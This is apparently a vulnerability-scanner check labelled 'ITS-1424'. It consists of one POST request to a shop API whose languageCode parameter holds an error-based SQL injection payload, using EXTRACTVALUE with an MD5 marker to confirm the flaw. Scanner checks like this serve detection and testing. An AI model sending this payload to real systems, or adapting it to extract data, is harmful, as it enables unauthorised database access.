# Vulnerable: ITS-1424
POST /shop-api?languageCode=en'+AND+EXTRACTVALUE(5202,CONCAT(0x5c,(SELECT+MD5('{{num}}'))))+AND+'ptic'%3d'ptic
